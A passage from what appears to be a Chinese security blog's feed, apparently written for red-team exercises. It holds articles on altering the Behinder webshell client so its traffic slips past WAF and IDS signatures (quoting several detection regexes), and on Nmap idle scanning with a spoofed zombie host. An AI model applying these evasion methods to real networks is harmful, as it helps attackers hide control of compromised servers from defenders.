+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image39.png"></p>
+<p>运行结果：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image40.png"></p>
+<p>客户端连接：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image41.png"></p>
+<h3 id="header中的Content-Type-2"><a href="#header中的Content-Type-2" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>ASP 版本的此问题跟 JSP 版本相同，都是在连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，可参考  JSP版本的修改思路。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image42.png"></p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>在笔者编写此篇文章之际，已经听闻到有”冰蝎”即将更新的消息。在这 HW 来临之际进行更新，可以预见到攻防两方都需要对此做好准备。祝各位参与 HW 的读者：HW 顺利 !</p>
+<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image43.jpeg"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+        <tag>安全工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>冰蝎，从入门到魔改</title>
+    <url>/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/</url>
+    <content><![CDATA[<h2 id="0x01-什么是冰蝎？"><a href="#0x01-什么是冰蝎？" class="headerlink" title="0x01 什么是冰蝎？"></a>0x01 什么是冰蝎？</h2><p>“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，第一代webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测到。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image1.png"></p>
+<p>“冰蝎”客户端基于JAVA，所以可以跨平台使用，最新版本为v2.0.1，兼容性较之前的版本有较大提升。主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等，功能非常强大。</p>
+<h2 id="0x02-加密原理"><a href="#0x02-加密原理" class="headerlink" title="0x02 加密原理"></a>0x02 加密原理</h2><p>我们以PHP版本为例，”冰蝎”在服务端支持open_ssl时，使用AES加密算法，密钥长度16位，也可称为AES-16。此在软件及硬件(英特尔处理器的AES指令集包含六条指令)上都能快速地加解密，内存需求低，非常适合流量加密。</p>
+<p>加密流程大致如下图所示：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image2.jpeg"></p>
+<p>首先客户端以Get形式发起带密码的请求。</p>
+<p>服务端产生随机密钥，将密钥写入Session并将密钥返回客户端。</p>
+<p>客户端获取密钥后，将payload用AES算法加密，用POST形式发送请求。</p>
+<p>服务端收到请求，用Session中的密钥解密请求的Body部分，之后执行Payload，将直接结果返回到客户端。</p>
+<p>客户端获取返回结果，显示到UI界面上。</p>
+<p>我们看到在图中，”冰蝎”在执行Payload之后的返回，并没有显示加密，这点我们可以从自带的webshell中看出。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image3.png"></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image4.png"></p>
+<p>这个问题需要解密一下”冰蝎”的流量，才能知道答案。</p>
+<h2 id="0x03-通信过程"><a href="#0x03-通信过程" class="headerlink" title="0x03 通信过程"></a>0x03 通信过程</h2><p>我们用wireshark来抓包看下”冰蝎”通信过程：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image5.jpeg"></p>
+<p>从抓包结果上粗略来看，加密效果是不错的，全程基本没有可读的执行代码。</p>
+<p>我们用服务端返回的密钥，对客户端发送的报文内容进行解密。</p>
+<p>解密结果为如下代码：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image6.png"></p>
+<p>我们发现核心内容只是一个简单的JSON格式的success的返回，但是会将结果使用AES包装一层加密，所以我们看到webshell中没有加密，而流量却是加密的。</p>
+<h2 id="0x04-时过境迁"><a href="#0x04-时过境迁" class="headerlink" title="0x04 时过境迁"></a>0x04 时过境迁</h2><p>攻防技术一直都在不断发展的，要想保证攻防的持续有效，就需要不断地更新自我。”冰蝎”的最新版本v2.0.1，在发布于2019.2之后就没有进行过更新。而各大厂商的检测系统及WAF均已经对其特征进行分析并加入规则。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image7.png"></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image8.png"></p>
+<p>各路分析其流量规则的文章也层出不穷。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image9.png"></p>
+<p>原版”冰蝎”已经不能满足攻防对战的要求了，这时我们需要自己动手。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image10.png"></p>
+<h2 id="0x05-魔改准备"><a href="#0x05-魔改准备" class="headerlink" title="0x05 魔改准备"></a>0x05 魔改准备</h2><p>首先用JD-GUI等反编译工具，反编译JAR包获得源码。可以从中可以看到UI文件引入的包名看到，”冰蝎”使用了SWT框架作为UI。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image11.png"></p>
+<p>既然这样我们直接用Eclipse安装WindowsBuilder，来直接创建SWT项目。</p>
+<p><strong>安装WindowsBuilder</strong></p>
+<p>在Eclipse的Marketplace里搜索WindowsBuilder，点击Install即可安装。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image12.png"></p>
+<p>之后我们直接创建基于SWT项目，即可避免因swt包缺失导致的报错问题。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image13.png"></p>
+<p>我们将反编译之后的源码和JAR包导入项目，在通过搜索源码和修复报错（会有一大波报错等待你修复，可以多种反编译工具对比结果来修改）等方式尝试将源码跑起来。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image14.png"></p>
+<p>最终我们终于成功跑起来了反编译之后的代码。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image15.jpeg"></p>
+<p>可以看到项目结构比较简单清晰，主要逻辑都在net包下，Main.java为程序入口。这里简单介绍下各个模块代码的作用：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image16.png"></p>
+<p><strong>出于对原作者的瑞思拜，不会放出任何项目文件。</strong></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image17.jpeg"></p>
+<h2 id="0x06-特征擦除"><a href="#0x06-特征擦除" class="headerlink" title="0x06 特征擦除"></a>0x06 特征擦除</h2><p>经过对网上多篇对”冰蝎”特征的资料参考，总结出几条特征并将其特征给予修改擦除。以PHP版本为例，其他语言版本异曲同工。</p>
+<h3 id="1-密钥交换时的URL参数"><a href="#1-密钥交换时的URL参数" class="headerlink" title="1.密钥交换时的URL参数"></a>1.密钥交换时的URL参数</h3><p>首当其冲的就是密钥交换时的参数，用GET请求方式，默认webshell的密码为pass，并且参数值为3位随机数字。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image18.png"></p>
+<p>从webshell上看，参数值的随机数字并没有任何实际作用：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image19.png"></p>
+<p>客户端代码上看也只是随机数：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image20.png"></p>
+<p>我们来看下一般对此情况的检测规则：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\.(php|jsp|asp|aspx)\?(\w)&#123;1,10&#125;&#x3D;\d&#123;2,3&#125;  HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p>该规则可以匹配1-10位密码的webshell，并且参数值位2-3位的数字。</p>
+<p><strong>修改思路：</strong></p>
+<p>增加随机数量的随机参数和随机值（随机值不为全数字），并且密码参数不能固定为第一个。</p>
+<p><strong>修改后的效果：</strong></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image21.png"></p>
+<h3 id="2-header中的Content-Type"><a href="#2-header中的Content-Type" class="headerlink" title="2.header中的Content-Type"></a>2.header中的Content-Type</h3><p>默认在header中的Content-type字段，在一般情况下的GET形式访问是没有该字段的，只有POST形式的访问才会有。但”冰蝎”不论是GET形式还是POST形式的访问均包含此字段。此处露出了较大破绽，而且该字段的大小写有点问题，所以基于这个规则基本可以秒杀。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image22.png"></p>
+<p>我们来看下这块相关的的代码：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image23.png"></p>
+<p>ShellService代表一个Shell服务，在其构造函数中31行判断了，如果类型是php则在header中加入<br>Content-type<br>头。但在35行的getKeyAndCookie向服务端发送GET请求获取密钥时，也将此header头带入其中，所以发送GET请求包时也会携带此参数。</p>
+<p><strong>修改思路：</strong></p>
+<p>GET形式访问时在header中去掉此字段，POST形式访问时将值改为<br>Content-Type值改为”text/html;<br>charset=utf-8”以规避安全检测（值也可以不改）。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image24.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image25.png"></p>
+<h3 id="3-header中的User-Agent"><a href="#3-header中的User-Agent" class="headerlink" title="3.header中的User-Agent"></a>3.header中的User-Agent</h3><p>User-Agent是代表一般指用户代理，会包含浏览器和操作系统等信息标志。在”冰蝎”的早期版本存在User-Agent特例化问题，最新版本已经解决了这个问题。解决方案是：每个shell连接会从17个内置的UA里随机选择一个。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image26.png"></p>
+<p>来看下这部分的JAVA代码：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image27.png"></p>
+<p>可以看到是随机从常量Constants.userAgents中取了一个值。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image28.png"></p>
+<p>这块的问题是UA包含的浏览器版本比较旧，比如：Chrome/14.0.835.163是2011年发布的版本，Firefox/6.0也是2011年的版本。这种浏览器基本很少人使用，所以特征较为明显，可以作为规则参考。</p>
+<p><strong>修改思路：</strong></p>
+<p>使用较新版本的常见浏览器UA来替换内置的旧的UA常量。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>2020年发布的Firefox 75.0：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image29.png"></p>
+<p>2019年11月发布的Chrome 78.0.3904.108：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image30.png"></p>
+<h3 id="4-header中的Accept"><a href="#4-header中的Accept" class="headerlink" title="4.header中的Accept"></a>4.header中的Accept</h3><p>在请求header中的Accept字段默认会是一个比较奇怪的值，此值在GET形式和POST形式的请求中均存在。而在正常的浏览器或其他设备访问的报文中Accept的值不会是这样的，所以此处也可以作为一个强力有效的规则检测依据。</p>
+<p>GET请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image31.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image32.png"></p>
+<p>此处产生的原因是JAVA的HTTPURLConnection库（”冰蝎”使用的HTTP通信库）在没有设置Accept值时会自动设置该值作为默认值，而源码中默认并没有对Accept进行处理。</p>
+<p><strong>修改思路：</strong></p>
+<p>修改请求header中的Accept的值。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>GET请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image33.png"></p>
+<p>POST请求：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image34.png"></p>
+<h3 id="5-二次密钥获取"><a href="#5-二次密钥获取" class="headerlink" title="5.二次密钥获取"></a>5.二次密钥获取</h3><p>在”冰蝎”的默认流量中，会有两次通过GET形式的请求获取密钥的过程，这点比较奇怪。</p>
+<p>此处也可作为一个检测点。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image35.png"></p>
+<p>我们来看下代码实现：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image36.png"></p>
+<p>这一步是将密钥存入rawkey_1变量中。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image37.png"></p>
+<p>再次获取的密钥存到rawkey_2变量中，之后rawkey_1和rawkey_2进行了异或操作，通过异或结果来判从而结束循环条件，最多尝试获取10次密钥。实话说这块代码没太看出来作用，实际是大部分情况2次就OK了，3次获取密钥的情况都不太多。个人感觉这块是为了校验获取到的密钥是否可用以及控制获取密钥的次数。</p>
+<p><strong>修改思路：</strong></p>
+<p>删掉多次获取密钥的过程，可以改成一次获取密钥。或者直接把密钥写到webshell里，省去获取密钥的过程。</p>
+<p><strong>修改后的效果：</strong></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image38.png"></p>
+<h3 id="6-response中返回密钥"><a href="#6-response中返回密钥" class="headerlink" title="6.response中返回密钥"></a>6.response中返回密钥</h3><p>在获取密钥时，密钥返回是直接以16位字符的形式返回到客户端。这时会有比较大的破绽，我们来看下常用的检测规则：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\r\n\r\n[a-z0-9]&#123;16&#125;$</span><br></pre></td></tr></table></figure>
+<p>和</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Length: 16</span><br></pre></td></tr></table></figure>
+<p>检测内容是：以两个\r\n完整换行加上16位字母小写+数字组合为结尾，再配合Content-Length:<br>16 为规则一起检测。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image39.png"></p>
+<p>我们来看下客户端代码对于密钥的匹配规则：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image40.png"></p>
+<p>源码只匹配了16位的字母a-f大小写+数字，hah~ 这是因为啥呢？？？</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image41.png"></p>
+<p>原因在”冰蝎”默认自带的webshell里：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image42.png"></p>
+<p>因为webshell<br>生成的密码算法为md5，md5输出结果显示是16进制，所以只有0-9a-f。</p>
+<p><strong>修改思路：</strong></p>
+<p>GET形式访问时，可以加入一些混淆的返回内容，或者将密钥变型。</p>
+<p><strong>修改后的效果：</strong></p>
+<p>可以先从视觉效果上隐藏起来：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image43.png"></p>
+<p>流量侧：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image44.png"></p>
+<p>这里只是简单的加了一些内容作为演示，实战时可以根据情况混淆。</p>
+<h3 id="7-header中的Cookie"><a href="#7-header中的Cookie" class="headerlink" title="7.header中的Cookie"></a>7.header中的Cookie</h3><p>因为”冰蝎”默认自带的webshell中的key在将密钥返回客户端后，会将密钥保存在Session中。而SessionId在第一次客户端请求时作为Cookie发送给了客户端，所以Cookie也是作为我们一个重要检查点。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image45.png"></p>
+<p>Cookie中的问题是”path=/“这部分。在访问服务器时，服务端将Cookie以Set-Cookie的response头中的形式返回，其中Path是该Cookie的应用路径。</p>
+<p>举个例子：</p>
+<p>Cookie1; Path=/</p>
+<p>Cookie2; Path=/admin/</p>
+<p>当浏览器访问网站 “/“ 路径时，只会携带Cookie1。当访问 “/admin/“<br>路径时，会同时携带Cookie1和Cookie2。</p>
+<p>在正常浏览器访问下，path是不会作为Cookie本身的一部分发送到服务端的。</p>
+<p>来看下客户端代码：</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image46.png"></p>
+<p>此处将服务端返回的Cookie所有字符都在客户端存储起来，当客户端发送请求时全部将这些字符作为Cookie发送出去。</p>
+<p><strong>修改思路：</strong></p>
+<p>将发送请求中Cookie的Path字段去掉。</p>
+<p><strong>修改后的效果：</strong></p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image47.png"></p>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>在实际检测中，单一的规则检测对”冰蝎”的误报率会比较高，一些比较明显的特征相互结合使用，会有事半功倍的效果。通过魔改程序也只能在一定时间内绕过安全设备的检测。真正想要持续有效必须不断更新，不断学习，在这攻防的浪潮中砥砺前行。</p>
+<p>安全路漫漫，与君共勉。</p>
+<p><img src="/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/image48.jpeg"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+        <tag>安全工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>你不知道的Nmap之空闲扫描</title>
+    <url>/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透测试的过程中，我们会经常会用到Nmap进行信息收集。但是Nmap存在一个缺点就是在进行探测过程中会向目标发送大量数据包，从而产生大量流量，这样极其容易引起目标警觉，甚至追踪到渗透测试者的真实IP地址。那我们该如何做才能做到既隐藏了自己的真实IP地址同时又能实现我们信息收集的任务呢？</p>
+<p>Nmap中有一种比较强大的扫描方式是空闲扫描（Idle Scan），命令是<br>-sI（I为i的大写）。这种技术是利用空闲主机欺骗目标主机IP并且隐藏本机真实IP。</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image1.png"></p>
+<h1 id="IP报文中的ID及TCP握手"><a href="#IP报文中的ID及TCP握手" class="headerlink" title="IP报文中的ID及TCP握手"></a>IP报文中的ID及TCP握手</h1><p>空闲扫描利用了IP协议报文中的ID和TCP协议通信原理。首先我们先来看下IP协议报文结构：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image2.png"><br><strong>标识</strong>：唯一的标识主机发送的每一分数据报。通常每发送一个报文，它的值+1。当IP报文长度超过传输网络的MTU（最大传输单元）时必须分片，这个标识字段的值被复制到所有数据分片的标识字段中，使得这些分片在达到最终目的地时可以依照标识字段的内容重新组成原先的数据。</p>
+<p>就是说当我们发送的IP报文未超过MTU时，通常每个报文的标识会+1，当然这个是该端口所有IP报文公用的。当我们向10个目标及端口发送IP包是，每个报文的标识会依次递增+1。这也是为什么我们需要空闲的主机的原因，可以根据IP报文中的标识来推测扫描结果。</p>
+<p>TCP协议正常三次握手：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image3.jpeg"><br>熟悉TCP协议的同学知道TCP在建立链接的时候会有三次握手行为。除了正常的控制位，还有一些用于其他情况的标识位如：RST</p>
+<p><strong>RST</strong>：重置连接标志，用于重置由于主机崩溃或其他原因而出现错误的连接。或者用于拒绝非法的报文段和拒绝连接请求。</p>
+<p>当打开的TCP端口接收到非法报文会回复RST以示对面重置该连接。空闲扫描也正是利用了这点达到目的。</p>
+<h1 id="空闲扫描原理"><a href="#空闲扫描原理" class="headerlink" title="空闲扫描原理"></a>空闲扫描原理</h1><p>空闲扫描利用 TCP<br>的通信原理：当直接发送SYN,ACK包时目标会因为握手流程不合法，所以会回复RST包以重置。但此时回复的包中会带有目标IP包中的ID。</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image4.png"><br><strong>第一步：</strong></p>
+<p>向僵尸主机开放的TCP端口(如80端口的HTTP服务)发送SYN,ACK<br>包，僵尸主机会回复RST。僵尸主机回复的报文中的IP协议中ID为1397。</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image5.png"></p>
+<p><strong>第二步：</strong></p>
+<p>伪造僵尸主机的IP（192.168.81.2）向目标的端口发送SYN报文，如果该端口开放会按照TCP协议握手流程向僵尸主机回复SYN,ACK报文。但是僵尸主机收到的第一个报文为SYN,ACK<br>流程不合法，会回复RST并且ID会 +1 。</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image6.png"><br><strong>第三步：</strong></p>
+<p>这时候我们重复第一步的流程，向僵尸主机开放的TCP端口(如80端口的HTTP服务)发送SYN,ACK<br>包，僵尸主机会回复RST。我们可以根据僵尸主机回复的报文中的IP协议中ID<br>来判断目标主机跟僵尸主机是否产生了通信：</p>
+<p>如果ID=1399（跟1397比+2），目标端口跟僵尸主机产生过通信，故目标端口开放。</p>
+<p>如果ID=1398（跟1397比+1），目标端口跟僵尸主机未产生过通信，故目标端口未开放。</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image7.png"></p>
+<h1 id="Nmap空闲扫描算法实现"><a href="#Nmap空闲扫描算法实现" class="headerlink" title="Nmap空闲扫描算法实现"></a>Nmap空闲扫描算法实现</h1><p>虽然我们对原理进行了阐述，但是Nmap在实际中的实现要复杂一些。这时可以利用包追踪的方式来理解Nmap的实现。Nmap的—packet-trace选项可以显示出包追踪的详情：</p>
+<p><img src="/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/image8.png"><br>可以看到Nmap首先对空闲僵尸主机192.168.81.2尝试发送了6个SA（SYN，ACK）的TCP包，空闲僵尸主机回复了6个R（RST）的TCP包。6个回复的RST包中的id为5449-5454，Nmap确认其类型为递增，开始进行下一步。</p>
